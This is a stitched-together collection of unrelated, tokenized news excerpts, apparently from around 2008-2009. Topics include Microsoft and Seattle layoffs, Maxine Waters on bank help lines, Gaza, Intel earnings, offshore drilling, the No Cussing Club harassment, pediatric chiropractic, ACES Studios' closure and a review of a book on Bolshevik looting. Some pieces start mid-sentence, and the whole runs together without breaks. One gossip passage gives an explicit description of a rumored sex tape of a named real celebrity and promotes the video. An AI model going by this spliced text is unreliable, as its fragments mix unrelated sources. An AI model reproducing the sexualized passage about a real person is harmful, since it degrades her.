Washington state ’s jobless rate rose in December to 7.1 percent -- just a tad shy of the nation ’s 7.2 percent , from 6.4 percent in November .

Washington Mutual Inc -- once the largest U.S. savings and loan but since collapsed and taken over by JPMorgan -- will shed 9,200 jobs .
About 3,400 of those jobs will come out of Seattle , the Seattle Times reported last month .
Boeing
Co unveiled plans this month to cut 4,500 workers -- most of them in Washington .
And Starbucks -- the brand virtually synonymous with Seattle ’s boom -- is in the midst of layoffs of potentially thousands , though executives would not specify a final number .
“ This is the worst economy I ’ve seen in my life .
The way Seattle is shedding jobs reflects what ’s happening elsewhere , ” said retiree Conrad Shock , 58 , as he sipped at a coffee in Starbucks ’s first store , opened in 1971 in downtown Seattle ’s historic Pike Place market .
“ I do n’t think we ’ve seen the worst of it , ” he said , adding that his retirement accounts had been cut in half in just the past year .
His wife Kim said : “ Unfortunately it ’s everywhere . ”
Microsoft ’s layoffs -- of about 5 percent of its total workforce -- came after weeks of Web and media speculation .
“ It is disheartening that one of Washington ’s premier businesses is reducing its work force .
Unfortunately , it is another indication that the national economic recession is deepening , ” Washington Governor Chris Gregoire said in a statement .
“ Our highest priority is to help those workers find other good jobs as quickly as possible . ”
Back at the Microsoft campus , employees veered between relief and trepidation .
“ We were waiting for the shoe to drop .
It ’s not even a large percentage of the workforce .
But I have n’t had time to digest it yet ” , said a middle manager from Microsoft in his 30s .
“ I ’ve been through layoffs before at Hewlett Packard .
It ’s led to good things .
I love my job here but whatever happens , happens , ” said another Microsoft employee in his 40s .
On Hold : Even Congresswoman Gets the Runaround on Bank Help Lines
Rep. Maxine Waters Dials and Redials Attempting to Get Help for Constituents
In a revealing example of what she says the average homeowner faces , a California Congresswoman spent more than two hours on the phone trying , without success , to find someone at the Bank of America who could help a struggling constituent modify his mortgage payments .
ABC News " Nightline " cameras were rolling as Congresswoman Maxine Waters ( D - Ca. ) was repeatedly put on hold for long stretches , disconnected , transferred to extensions that did not work and ultimately switched to a recording which directed her to the bank 's website .
" The average American trying to negotiate a loan modification will not be able to get it done , " said Waters .
" It will be impossible for them to get in touch with the right person , and even if they get in touch with a so - called counselor , they have a cookie cutter kind of direction that they go in . "
While the federal government and banks say they 're trying to help homeowners avoid foreclosure through various help lines and more , an ABC News investigation has found that the process of reaching out for help can be disorganized and frustrating , hardly consumer friendly , even when a prominent member of Congress is on the line .
To prove her point , Waters agreed to let " Nightline " listen in on her attempts to contact her constituents ' lenders on behalf of homeowners with nowhere else to turn .
Click here to watch Rep. Waters on the phone .
" Most of the day was spent trying to trace down the right person or the right department to deal with the loan modification , " said Waters .
" It was awful . "
The Beards of Los Angeles are a retired couple who are not even behind on their mortgage payments , but they , like many others , are struggling to keep up .
When Waters offered to call Bank of America on their behalf , it turned into a two hour ordeal .
Waters was met first with a recording that many callers have heard before , " all representatives are currently assisting other customers , please hold and your call will be answered in the order in which it was received . "
Congresswoman Continues to Hold ...
Waters was on hold for ten minutes before an operator finally came to the line .
Because the Beards were not behind on payments , just looking for a modification , Waters thought the call would be easy .
But it was n't .
First she was transferred to another department , then put on hold for three more minutes , and then she was disconnected , all while Mr. Beard was listening in .
" That 's what I usually get when I call them , " he said .
" They say they 're going to transfer me and when they transfer me , the line goes dead . "
Undeterred , Waters called Bank of America again .
This time the extension the bank had given her did not work .
So , for a third time , 49 minutes after she first dialed the bank , the congresswoman called the 800 number once again and was greeted with more recordings , more music .
" This is absolutely horrible , " she said while holding the line .
On her fourth try , Waters was directed to yet another department , and then transferred to hardship assistance .
But when she explained the Beards ' situation to the agent in that department , she was told that because they had n't yet missed a payment , she needed to call the refinancing department .
Almost two hours after her first attempt to reach a loan officer , Waters was finally transferred to the refinancing department -- where she was greeted with a recording and then cut off .
" Oh my goodness , " Waters remarked .
" Well , what they [ the recording ] just said is go to your computer and fill out info to see if you qualify .
They do n't check to see if you have a computer and they do n't come back on line . "
The Bank of America says it does a good job and is almost always quick to respond to calls .
" On average one to two minutes , " said Steve Bailey , who heads the loan division of Bank of America .
" In terms of once you are waiting for a cue from an agent , it takes one to two minutes to get through to somebody .
Certainly if we are urgently wanting to speak to people we do n't want them to wait 20 , 30 minutes on hold just to talk to us . "
Bank of America Apologizes
Bailey offered an apology to Waters and the Beards for the process they went through saying that 's absolutely not the way Bank of America wants things to go .
But the congresswoman believes her experience was typical .
" Anybody witnessing what I was going through could see that I got pretty aggravated , and that I got upset about the basic inconvenience of the so - called system that they have , the lack of responsiveness , the inability to get anything done , " said Waters .
Carol and Dave Harper of Los Angeles are behind on their mortgage payments and face possible foreclosure .
Mr. Harper is recently disabled .
Since last summer the Harpers have been trying without success to get IndyMac bank to modify their mortgage so they can make their monthly payments .
" We worked hard for this , " Mrs. Harper told ABC News . "
He worked until he could n't work any longer .
I can't do it any more .
I do n't know what I 'm going to do if these people take my home .
I have nothing else . "
Mrs. Harper says her calls to Indymac and multiple visits to bank counselors have resulted in nothing more than a six - month runaround .
" I 've called .
I 've been on the phone so much it 's pathetic , " said Mrs. Harper .
" It 's hard .
I 'm at a point where I do n't know where else to go . "
When Waters attempted to reach Indymac on behalf of the Harpers it took her four minutes to get through all the recorded messages , prompts , and music to finally speak to a real person .
Though once Waters identified herself she was quickly transferred to the public relations department .
Despite her VIP - treatment , however , the Harpers still have not been able to get the bank to help them .
IndyMac told ABC News that the Harpers ' case is too complex to handle through the call center and that the bank is now trying to help them .
Waters says her experience is further evidence that the lenders have created , but are not helping to solve the mortgage crisis .
" I think what we have discovered speaks for itself .
They 're not trying to help people do loan modifications , " she said .
" They put these products out on the street .
They had brokers and salespersons out there signing people up because they really did n't have to keep them .
They had investors and they securitized and packaged these things and sent them up to Wall Street . "

Israeli Foreign Minister Tzipi Livni defended the Israeli assault in Gaza , saying on America ’s Sunday morning talk shows that Hamas , not Israel , “ is the one who needs to be condemned by the international community . ”
Reacting to anger from the Arab world , as well a call by the United Nations to cease hosilities , Ms. Livni said on “ Fox News Sunday ” that the assault “ is needed in order to change the realities on the ground , and to give peace and quiet to the citizens in southern Israel . ”
Speaking from Jerusalem in taped interviews , Ms. Livni said that until Hamas recognized Israel ’s right to exist and ceased rocket attacks against Israel , they remained terrorists who needed to be acted against .
The Israeli air assault has killed at least 280 Palestinians since it began Saturday .
Google used its booth at Macworld this year to show off some of the things it was working on with Apple , particularly for the iPhone .
But the coolest thing at their booth did n’t have much to do with Apple at all : A hacked Nintendo Wii Balance Board ( from the game Wii Fit ) used to control Google Earth .
Using the Google Earth application programming interface ( API ) , a Google engineer was able to get the Balance Board to talk to the program after decoding the Bluetooth packets being sent from the board ( that ’s how the device wirelessly interacts with a machine like the Nintendo Wii ) .
The result ( which you can see in the video below ) allows users to move forward by leaning forward , move backwards by leaning back , etc .
The developer says he made this neat little demo to inspire others to code their own programs using these open source methods .
Hopefully , someone comes up with a hack to make it so I can use my Wiimote to control my Apple TV , so I can stop using that damn directional pad .

The UN 's special torture rapporteur called on the US Tuesday to pursue former president George W Bush and defence secretary Donald Rumsfeld for torture and bad treatment of Guantanamo prisoners .
" Judicially speaking , the United States has a clear obligation " to bring proceedings against Bush and Rumsfeld , the United Nations Special Rapporteur on Torture Manfred Nowak said , in remarks to be broadcast on Germany 's ZDF television Tuesday evening .
He noted Washington had ratified the UN convention on torture which required " all means , particularly penal law " to be used to bring proceedings against those violating it .

A young mother of three children under the age of seven was killed by a shard of glass after a beer bottle was hurled into a pub during Boxing Night celebrations .
Emma O'Kane , 27 , collapsed in a pool of blood when the glass slashed her neck as she chatted with friends in the Queen Anne in Heywood , Greater Manchester .
Police said that a man who had been refused entry to the pub after an argument with bouncers a few minutes earlier had thrown a beer bottle into the crowded saloon .
The bottle smashed as it hit a pillar near where Ms O'Kane was standing , and glass pierced vital arteries in her neck .
She was with her partner , Michael Shepherd , who was celebrating his 38th birthday , and four friends when she died .
Ms O'Kane , who was employed as a barmaid at the pub , lived a mile away with Mr Shepherd and her three children , aged six , two , and one .
Yesterday , as the children played with their Christmas presents , the family spoke of their grief .
Mr Shepherd said : " We had all gone out for a drink to celebrate my birthday and went back to the pub where Emma works as a barmaid for one last drink to end the night .
I was in the snug room and Emma wandered into the main bar .
Everyone knows her in the pub and she was saying goodbye to some of her friends .
I heard something and then saw Emma on the floor .
I just thought that she had fallen over .
But then I realised that she was not moving and that her eyes were open and there was blood all over the place .
" She was staring up at the ceiling - I realised that it was really bad .
One bloke went to help her and was holding her hand .
People were shouting that someone had thrown something .
I tried to revive her by holding her legs up in the air because someone said that would help .
I ran for some tissue paper from the toilets and a girl held the tissue paper to her neck .
But I think she had lost too much blood .
I think she had gone there on the floor of the pub .
" The ambulance came and the paramedics tried to revive her on the way to hospital but it was too late .
The person who did this is a scumbag .
I wish it was him who was on the floor .
He has taken away a wonderful woman . "
Emma 's mother Diane , 47 , said : " Emma loved looking after people and planned to get a job in a nursing home .
She loved her kids - they were everything to her and she was the best mum . "
Ms O'Kane was taken to Fairfield Hospital in nearby Bury but she was pronounced dead shortly after arrival .
Last night friends and wellwishers attached floral tributes to the front windows of the pub in Market Street in the centre of Heywood , located between Bury and Rochdale to the north of Manchester .
Detective Superintendent Peter Jackson , of Greater Manchester Police , said : " A man tried to get into the pub and was refused entry .
He became involved in an altercation with the doormen and threw a bottle into the pub .
A shard of glass then caused a serious injury to this woman , who was nothing to do with the argument .
" This tragic incident has left this woman 's family devastated .
We are doing all we can to try and find who is responsible for this . "
A 19 - year - old man has been arrested on suspicion of murder and remains in police custody for questioning .
With the holiday season upon us , shoppers are kicking their spending into high gear , and these consumers
often consult gift guides for advice on what to buy .
A popular choice ?
Creating lists that advise parents on
what to NOT buy their kids .
In the video game industry , we 've all
gotten used to seeing such lists surface around this time of the year ; this week , we were treated to such an item by The Timothy Plan , a group that manages money based on Judeo - Christian principles .
While profanity and violence were on the list , the group 's attitudes toward homosexuality are what raised the most attention .
The Plan 's core business strategy is based on some very narrow principles ; it makes a point of only investing with companies that abide by certain moral codes .
Companies that do things like recognizing domestic partnerships are actively shunned .
Even though Microsoft is one of the favorite stocks to own in many mutual funds , The Plan wo n't touch the software giant because it officially recognizes GLBT ( Gay , Lesbian , Bi-sexual , Transexual ) groups .
Other surprises that are listed on the firm 's " Hall of Shame " list include Electronic Arts , the Walt Disney Company , and Vivendi for similar reasons ; recognizing GLBT groups helps " destroy children and families " according to the group .
The list 's authors ended up determining that Zero Punctuation 's review of Army of Two was spot on , as " somewhat homo - erotic undertones between the two main characters are present . "
Looking through the rest of the detailed games reveals that , yes , The Timothy Plan also bashes other games like Bully , Mass Effect , and Fable II for allowing players to become romantically involved with members of the same gender .
Visitors to the organization 's web site can determine if their mutual fund investments have any holdings with companies that produce these games .
By filling out a form and listing your mutual funds , the company will " send you a complimentary moral audit on your mutual funds which may own these as well as other objectionable companies . "
Listing the Vanguard S&P 500 Index Fund on the " Moral Audit Request Form " brought a speedy e-mail to my inbox , with the subject line reading " Violation Report . "
Within was a PDF form that displayed the moral violations of the companies my supposed nest egg was tied up with .
The top five objectionable companies , according to the document , all endorse " Non-Marriage Lifestyles . "
From the cover of The Timothy Plan 's report on offensive games
Ars contacted the Human Rights Campaign about the report .
" I think that the software industry reflects the diversity of the country , " said director of the HRC Workplace Project Daryl Herrschaft .
" Efforts like these do n't really have an impact on [ game ] sales or bottom lines ...
I do n't think most people 's purchasing decisions will be affected by [ the report card ] . "
The report demonstrates just how prevalent GLBT content has become in video games .
Much of this content made it into video games without actually generating much news : while having a gay / lesbian marriage in Fable II was talked about , collecting male erotica to get weapon upgrades in Shadow Hearts : Covenant did n't raise any protests .
Neither did Raikov 's frisky moves in Metal Gear Solid 3 , nor the revelation that Fear Effect 2's protagonists were lesbian lovers .
In fact , quite a number of popular game characters are n't straight , but society has yet to fall apart .
Gaming has become more progressive in the past ten years , and showing gay and lesbian characters in games as a normal part of life will go a long way to making sure being homosexual becomes even less newsworthy .
Buying stocks based on an opposition to how a group lives their life ?
It may be offensive , but it 's proving to be profitable .
A Financial Times article in January revealed that the investment group had roughly $ 500 million under its control , and it was seriously outperforming other firms that practice " moral investing . "
Britain ' must set population limit to safeguard national security ' say experts
Britain must set a maximum population level if it is to avoid destroying the environment and putting national security at risk , say experts .
The Optimum Population Trust has written to ministers calling for a policy of ' zero net migration ' - matching numbers allowed into Britain each year to numbers leaving .
The UK 's population is projected to increase from 60 to 70 million over the next 20 years , and to 85 million by 2081 .
Experts are demanding a Royal Commission to establish 'an environmentally sustainable level of population '
The trust , a panel of academics and environmentalists , says achieving zero net migration would cut Britain 's population in 2081 to 57 million .
Mass immigration ' feeds through into rising greenhouse gas emissions ' and more congestion , the experts say .
The trust warns that because Britain can produce only 30 per cent of the food , energy and other goods that it needs , it will become increasingly vulnerable to ' resource nationalism ' as foreign powers hoard their own scarce resources .
' This imperils future national security as well as destroying the environment , ' it says .
The trust is demanding a Royal Commission to establish ' an environmentally sustainable level of population ' .
The Home Office said its new points - based immigration system would help manage immigration , ' which will contribute to future population projections and control ' .
The economic slowdown and slumping demand for personal computers sent Intel 's net profit sharply lower as the world 's biggest computer chip maker reported its fourth - quarter results .
The Santa Clara , California - based company said on Thursday net profit in the last three months of the year plunged to 234 million US dollars , down 90 percent from a year ago , on revenue of 8.2 billion US dollars .
Intel reported profit of 2.0 billion US dollars in the third - quarter of 2008 , on 10.2 billion US dollars of revenue .
Intel also reported on Thursday that net profit for the year declined 24 percent to 5.3 billion US dollars on revenues of 37.6 billion US dollars , two percent lower than a year ago .
Intel lowered its fourth - quarter projections twice in the past few months and the results did not surprise analysts .
Earnings of 92 cents per share for the year were in line with expectations .

The US government has taken the first step in 25 years toward offshore drilling in the mid-Atlantic region , launching a study of a potential exploration area just north of the North Carolina border .
The 2.9 m - acre study area off the Virginia coast is within 55 miles of the North Carolina coast .
The US Minerals Management Service said yesterday it would prepare an environmental - impact study , beginning a 45 - day public comment period .
A decision whether to sell leases to the area in 2011 will come later .
No drilling plans are in play for the Carolinas .
The states ' coast could not be included in a schedule of potential lease areas until its next revision beginning in 2010 .
Soaring energy prices this year eroded long - standing political opposition to offshore drilling .
Critics say it would invite oil spills and tourism - killing industrialisation to the North Carolina coast .
Virginia , however , had requested that the Minerals Management Service include its offshore waters among potential lease locations .
Despite Virginia 's interest , two barriers prevented drilling off the US east coast until recently .
In July , President George Bush lifted an executive order making the area off - limits to drilling , and in September a congressional moratorium expired .
The study area is 50 miles off the Virginia coast .
Details on how the public can comment on the proposed lease will be published today in the Federal Register .
No drilling leases have been sold in the mid-Atlantic since 1983 .
" We live in a time where everybody is free to publish whatever he or she wants on blogs at will without taking any responsibility .
This exceeds mud-slinging .
I find that it 's nearly impossible to defend yourself against this . "
We have been asked to investigate recent rumors of a Ariana Grande full sex tape porn video that some large sites are claiming to have gotten their hands on .
If you do n’t know who Arianna is , she is better known as Cat Valentine on the Nickelodeon television series Victorious and her role on the hit show Sam & Cat with her “ annoying ” little voice .
Her music career has also been pretty decent with smash hits like “ The Way ” , “ Problem ” and “ Break Free ” She was in a long on again and off again relationship with the Jai Brooks who is famous in his own right as the YouTube sensation group The Janoskians and most recently a relationship with rapper Big Sean .
She has also been talked about a lot for being a little diva as when she gets tired of walking she will have someone carry her around instead of walking herself and this has been confirmed with several photos and individuals close to her confirming .
The tape in question supposedly shows Ariana with her signature red hair and Jai in a yacht bedroom completely naked and getting down and dirty with a run time of about 20 minutes featuring full on sex in pretty much every position with a finish where the male that would be labeled as Jai does his business on her back .
We got our hands on the video and have watched it from beginning to end and can with all confidence go on record that this is in fact not Ariana .
The girl in the video looks very much like the teen star but after breaking the video down in close ups we can see no doubt that it is not .
We have tried to pinpoint who is in the video cross referencing the porn star database but have not been able to verify who the individuals in the video really are .
Now do n’t get us wrong the video is pretty darn good and we put it in the members area so that you can decide for yourself what you think .
We put in calls to Ariana ’s reps asking about the tapes and they did get back to us .
“ We were unaware that our client was being portrayed as the individual in the video that you sent to us , we have contacted Ariana and we can confirm that she has said it is not her in the video and we will be taking action against the sites that are claiming it to be authentic and we thank you for bringing this to our attention . ”
Well , there ya go , finally a lawyer that was nice to us and thanked us for our hard work .

the most eventful , hold - on - to - your - hat time of the modern era , the New York Times this morning devotes A1 real estate to a thorough accounting of the president 's new life in the White House .
From what Barack Obama eats for lunch ( cheeseburgers ! ) to the temperature of his office ( hot ! ) to the contents of his fridge ( tea ! ) , no detail is too mundane , no routine too pedestrian , and no development as telling as this : President Obama , unlike his predecessor , will not require his staff to wear suit jackets in the Oval Office .
" The capital , " reporter Sheryl Gay Stolberg tells us , " flew into a bit of a tizzy . "
Christ .
What for ?
Obama is a modern man .
He uses a BlackBerry .
He plays pick - up basketball .
He fist - bumps , if not as often as he used to .
He does n't buy into the old saw that men have to wear two - piece suits to take themselves or their surroundings seriously .
( W. was never a modern man .
One suspects that W. only insisted on jackets in the Oval because his father and Reagan insisted on it , and he was n't going to settle for anything less .
Like a lot of things in his life , it was all about him . )
The new president is also wrapping his arms around some pretty big problems here , and if ditching the jacket and even rolling up his sleeves gets the blood flowing , " the capital " should calm the hell down and let the man work .
But a few words of caution , not that he needs it : the President would do well to avoid Jimmy Carter 's disastrous experiments with cardigan sweaters .
Presidents , unlike prime ministers , are both heads of government and heads of state , and Americans like a little pomp from the man in charge .
Public addresses , formal meetings , reading My Pet Goat to kids when he should be reading intelligence briefings : such are the times when Obama needs to convey a sense of majesty with a killer two - piece suit ( or — dare to dream — a three - piece ) that lets everyone know he 's in charge .
But the rest of the time — when he and his A - team actually have some shit to do — he should n't sweat the small stuff .
" The capital , " and the Times for that matter , should do the same .

January 16 , 2009  -- McKay Hatch was on a mission .
Bothered , he says , by the foul language he heard around school , he formed what he called the No Cussing Club ( http://www.nocussing.com), and soon had thousands of followers from around the world .
But then , on the Sunday after New Year 's , his father checked the group 's e-mail after church and found 7,500 unread messages -- some of them threatening , almost all of them filled with obscenities .
McKay , a 15 - year - old high school student from South Pasadena , Calif. , has found himself the victim of a massive online attack , with people sending offensive e-mails and trying to crash the group 's Web site .
Strangers ordered pizzas sent anonymously to the family home in the middle of the night .
The Hatches found their mail box clogged with porn magazines .
All , says McKay , because he was trying to make the world a better place .
" A lot of kids at my school , and some of my friends , would cuss and use dirty language all the time , " he says .
" They did it so much , they did n't even realize they were doing it .
It bothered me so much that one day I challenged them to stop . "
The No Cussing Club grew from a school project to a national phenomenon .
McKay appeared on dozens of news programs , was cited by Dr. Phil , and went to other schools to give inspirational talks .
But then came messages such as this :
" i am going to find you And mutilate you with a scalple " [ sic ]
Or this :
" Every time I see your stupid [ expletive ] braces on those stupid [ expletive ] teeth of yours on that stupid [ expletive ] face of yours I just want to kill you with my bear fists . " [ sic ]
Another message said , " Now , please , pack up your [ expletive ] , and leave .
You all are nothing more than [ expletive ] , and should be treated nothing more than such . "
McKay says he can imagine he touched a raw nerve .
" A lot of people were saying I was taking away their freedom of speech , " he told ABC News by phone when he came home from school for lunch .
" All I was trying to do was raise awareness . "
McKay 's father , Brent Hatch , says his son has been brave -- but in one day he received 35,000 pieces of spam .
" On the outside , he seems to be doing fine , " Mr. Hatch told ABC News , " but last night he came home from soccer practice , and for the first time he started crying .
We went out to grab a bite , just to get him out of the house . "
McKay said , " At first it was kind of scary , but then I realized they 're just bullies , and they wanted me to be scared . "
McKay 's parents have encouraged him in his quest .
They themselves published a book a few years ago , " Raising a G - Rated Family in an X - Rated World . "
But they say they never expected their son to have to endure more than a few taunts .
" I always give him the option to stop , " Brent Hatch said , " but he says , ' No , this is my mission . ' "
The Hatches say they called the local police for help , and then the FBI , after death threats turned up on the home answering machine .
( The FBI says , as a matter of policy , that it does not confirm or deny whether it is working on a case . )
A Los Angeles law firm has offered help too , threatening to sue the Internet service providers whose systems have been used to attack McKay 's effort .
Amid all the abusive messages , there have been encouraging ones as well .
" I just want to tell you that I think you are an amazing kid ! ! " wrote a woman from Canada .
" It 's a great thing you are doing here .
And I am also going to try to cut out my cussing also .
Thank you for that !! "
Another person wrote , " You are our future and it is up to you to determine the course of our nation with good morals , values and standards .
Thank you for standing up for what you believe in .
Keep up the good work ! "
Brent Hatch says he 's grateful how friends and schoolmates have come to his son 's support .
" Good is coming out of it , trust me , " he said , " though it 's sometimes hard to believe it when something like this happens . "

WHAT DO CHIROPRACTORS DO ?
WHAT DO CHIROPRACTORS DO ?
The most common therapy is spinal manipulation :
The chiropractor uses hands to apply controlled force to joints in an effort to relieve inflammation , pain and muscle tightness .
Advocates say manipulating the spine , skull or other body parts also can relieve irritated nerves causing symptoms elsewhere .
Those who treat children say they use a very gentle touch .
Similar therapies sometimes are performed by osteopathic physicians , physical therapists and others .
What training do chiropractors have ?
All have four years of professional study ; some have additional training in pediatrics or other specialties .
All states license chiropractors , and many insurers cover their services .

Melanie Booth never expected to take her baby to a chiropractor .
But when son Mac was 3 months old and having problems — difficulty with nursing , apparent discomfort when lying on his tummy and a tendency to turn his head only one way — his pediatrician recommended she do just that .
Booth , a university professor in Portland , Ore. , found that her lactation consultant and several friends also endorsed chiropractic care for kids .
BETTER LIFE : More on parenting and kids ' health
After one visit , she was a believer , too :
As chiropractor Elise Hewitt worked on Mac , " he began to quiver and shake , and it kind of scared my husband and me , " Booth says .
" But she explained ( she ) was releasing energy that was stored up incorrectly in his body and particularly his spine . …
And almost immediately , we saw a change in his ability to move his neck . "
The nursing and tummy time problems cleared up , too , Booth says , as Mac continued treatments over several months .
Stories such as Booth 's help explain why nearly 3 % of children in the USA were treated with chiropractic or osteopathic manipulation in 2007 , making it the second - most common form of complementary or alternative medicine for children , a government report said recently .
( Most common : natural products , such as fish oil and herbs . )
But stories are not studies .
Even practitioners such as Hewitt , president of the American Chiropractic Association 's council on pediatrics , concede their work is not backed by the kinds of studies that would be required if chiropractic care were a drug .
As the government report noted , " there is insufficient proof that ( alternative practices ) are safe and effective . "
The National Center for Complementary and Alternative Medicine , which released the report , was created to fill the research gap .
Chiropractors say they welcome the scrutiny .
Hewitt says : " I wish there were more high - level studies . "
But she also says she is comfortable treating kids based on preliminary research , 100 years of chiropractic history and her own experiences .
Harm is ' rare , but possible '
One large safety review , published in 2007 , did find a few serious injuries in children , including one death from a brain bleed and one case of paralysis .
But there was no proof spinal manipulation caused the injuries and no way to estimate how common such injuries might be , says Sunita Vohra of the University of Alberta in Edmonton , Canada .
" Serious harms may be rare but are possible , " she says .
She is working on further studies .
" I suspect that adverse events are very rare , " says Kathi Kemper , professor of pediatrics at Wake Forest University School of Medicine in Winston - Salem , N.C.
She would n't refer a child to a chiropractor for non-musculoskeletal problems but would n't ask parents to stop visits if they perceive benefits .
Word - of - mouth , not research , brings most parents to Jeanne Ohm , a chiropractor in Media , Pa. , and executive coordinator of the International Chiropractic Pediatric Association .
Parents " are usually referred by someone whose asthma went away or whose ear infections went away , " she says .
Ohm says she does not promise to cure any ailment in a particular child .
She emphasizes broader goals : " Taking stress and tension off the nervous system affects their whole physical body and their mental state .
We look at the whole person . "

Microsoft confirmed Friday that the software giant has shuttered ACES Studios , the developer of the Flight Simulator series of games , whose latest incarnation is Flight Simulator X .
The simulation is considered Microsoft 's oldest product , dating back to 1982 .
As the rest of the tech world scrambles to assess the implications of the recently announced 5,000 layoffs at software giant Microsoft , news has come in that might potentially spell the end of the company 's nearly 30 - year - old Flight Simulator series .
Microsoft confirmed Friday that the software giant has shuttered ACES Studios , the developer of the Flight Simulator series of games , whose latest incarnation is Flight Simulator X .
The simulation is considered Microsoft 's oldest product , whose original version first shipped in 1982 .
However , a Microsoft spokeswoman said that while the studio has been closed , the software company remains committed to the Flight Simulator franchise , without explaining how future products can be launched without a dedicated software development team backing them .
" We can confirm the closing of ACES Studios , which was responsible for the Flight Simulator franchise , " Microsoft spokeswoman Kelda Rericha told Appscout .
" Following our annual strategy review process , IEB [ Microsoft 's Interactive Entertainment Business unit ] is making adjustments within our business to align our people against our highest priorities .
The closure of ACES Studios was one of those specific changes . "
Rericha refused to disclose any further details regarding the future of the company .
She did , however , suggest that the Flight Simulator series is likely to stick around in some form or another .
" We are committed to the Flight Simulator franchise , which has proven to be a successful PC - based game for the last 27 years , " Rericha added .
" You should expect us to continue to invest in enabling great Live experiences on Windows , including flying games , but we have nothing specific to announce at this time . "
Of course , the Flight Simulator franchise is a fairly broad one , and anything falling under the largely online Live umbrella would likely be fairly different than the game 's traditionally resource - intensive online incarnation .
" It 's definitely confusing ; I wish I had more clarification on that that we could provide , Rericha added .
" At this point , they 're just not talking about it yet  how the product will , and if the product will , live within Microsoft . "
Microsoft does not have a time frame on when it will provide additional information , Rericha added .
The most likely scenario seems that , like the rest of us , Microsoft is still attempting to assess exactly how such a large number of redundancies will affect its business strategy .
Projects like Flight Simulator have likely been given a lower priority than , say , Windows or Office , and therefore their fates are still not entirely certain even in Redmond .
Numerous contractors also confirmed that they'd been let go in the ACES layoffs , including independent coders who were also fans of the series .
" One thing that every person at ACES will tell you is that the community and each of you in it mean the world to us for sharing our passion of flight , and so it really hurts that Gib and I can't tell you more , " " PlaneEater , one of the affected contractors , wrote in a thread on SimOuthouse.com .
" I was a FS fan before I joined the FS team , and being able to work on the sim we all love so much was a dream come true .
I just want to thank everyone here for the time and passion they 've poured into Flight Sim for so many years , and to let you all know that every person at ACES is in awe of how much the community cares about what we build . "
It seems unlikely that Flight Simulator will go away entirely , even if it means branding a Live game with the name , fans speculated .

Red Plunder - Sean McMeekin details the staggering thievery of Lenin and the Bolsheviks .
City Journal ^ | 24 December 2008 | Adam Kirsch
Posted on by neverdem
Historys Greatest Heist : The Looting of Russia by the Bolsheviks , by Sean McMeekin ( Yale University Press , 336 pp. , $ 38 )
Since 2006 , visitors to the NeueGalerie , the boutique museum of German and Austrian art in New York City , have had the chance to view one of Gustav Klimts most celebrated paintings his seductive , gold - spangled portrait of Adele Bloch - Bauer .
For the 70 years before that , however , you would have had to go to Viennas Austrian Gallery to see Klimts masterpiece .
That s because the painting , along with four other Klimts the Bloch - Bauer family owns , was stolen by the Nazis after the Anschluss , and retained by the Republic of Austria after World War II ended .
It took another six decades for the Austrian courts to rule that the Klimt had to be returned to Adele Bloch - Bauers rightful heir , who was 90 years old when she finally reclaimed her familys property and sold it to the NeueGalerie .
The wheels of justice ground very slowly in that famous case , but in the end thanks in part to increased public awareness of Nazi looting justice was done .
At the National Gallery in Washington , DC , however , the masterpieces on the wall have a different story to tell .
When visitors marvel at the jewels of that collection Jan van Eycks Annunciation , Botticellis Adoration of the Magi , the five Rembrandts they are benefiting , unwittingly in most cases , from a historical crime that puts even the Nazis looting to shame .
The core of the National Gallerys collection was bequeathed to the nation by Andrew Mellon , the industrialist and Treasury secretary who helped to start the museum .
But Mellons masterpieces started out on the walls of the Hermitage in St. Petersburg .
They were stolen , along with an incalculable quantity of other art objects , religious icons , jewels , silver plate , bonds , and cash , by the Bolsheviks who seized power in Russia in November 1917 .
And they made their way to the West , along with the rest of the nations accumulated treasures , thanks to European middlemen , who laundered Soviet loot as surely as the Swiss banks laundered Nazi gold .
That s the powerful and surprising argument that Sean McMeekin makes in Historys Greatest Heist , his careful tally of the world - historical theft that Lenin and his followers carried out between 1917 and 1922 .
The surprise consists in McMeekins relentless insistence on a historical truth still not automatically accepted : the moral equivalence of the Nazi Party and the Soviet Communist Party .
Yes , in the abstract , most thoughtful people would acknowledge that Lenins and Stalins crimes rivaled Hitlers , that the Gulag was as evil as the concentration camp .
But while Nazism is treated as a crime whose effects ought to be reversed , Communism is granted the grudging respect we give a historical fait accompli .
In other words , no one is about to sue the National Gallery to demand that the Rembrandts go back to Russia .
As McMeekin shows in his formidably documented , morally impassioned book , the Russian Revolution benefited from the beginning from such Western acquiescence .
The Bolsheviks could never have survived their first years in power without the connivance of Western European governments , industrialists , and financiers .
That s because their first act on seizing power , in a coup widely opposed by the Russian people , was deliberately to destroy Russias economy , leaving the regime wholly dependent on foreign financing .
McMeekin shows that , for all their expertise in dialectical materialism , the Bolsheviks had not the slightest idea how a modern economy or financial system worked .
With the decree of December 27 , 1917 , abolishing private banks and repudiating government bonds , they effectively destroyed the nations wealth , along with any incentive for investors to invest or workers to work .
 We find ourselves in a lunatic asylum ,  wrote the manager of the Russian and English Bank .
The result was wholly predictable : Russia went from being the worlds largest exporter of grain to the brink of mass starvation , a crisis averted only thanks to the American Relief Administration of Herbert Hoover .
The population of Petersburg fell by 80 percent ; the streets of Moscow were not cleaned for three years .
 If the principal function of most governments is to cultivate law and public order ,  McMeekin writes ,  that of Lenins was precisely the opposite : to eradicate all existing law and institutions and to encourage class war . 
With the nations economy wrecked and its banking system abolished , however , the Bolsheviks had no way to raise funds except by selling whatever they could confiscate to foreign buyers .
Accordingly , they acted less like a government than like a gang of thieves , but not especially competent ones .
They could not , for instance , manage to open the safe - deposit boxes in most Russian banks ; they were reduced to issuing a decree commanding box owners to turn over their keys that is , to help the government rob them .
What they did manage to confiscate from banks , churches , and private owners , most notably the Romanovs they could sell only in the way thieves fence their loot : surreptitiously and at a huge discount .
McMeekins book bristles with the names of Soviet emissaries who sneaked into Sweden and Switzerland with suitcases full of cash and jewels .
The Swedish mint worked overtime melting down Russian gold and restamping it so that it could be sold in London and New York .
And while the Entente powers officially banned such sales , they effectively did little to prevent them ; there was too much money to be made .
If Swiss banks are now held in contempt for their role in World War II , McMeekin argues , many Swedish banks ought to be just as ashamed of their role in the post - Versailles period .
McMeekins chief Western villain , however , is David Lloyd George , the English prime minister , who decided to lift the Royal Navys blockade of Russia just as the Civil War seemed to be turning against the Reds .
( During the same period , Lloyd Georges impetuous decision first to back , then to abandon , Greek aggression in Turkey led to a near - genocide there . )
Even the Conservative leader , Andrew Bonar Law , asked ,  What is the use of our saying that we wont do trade with the USSR ?
Only Winston Churchill remained steadfast , refusing to meet with the Soviet trade delegate when the rest of the Cabinet welcomed him .
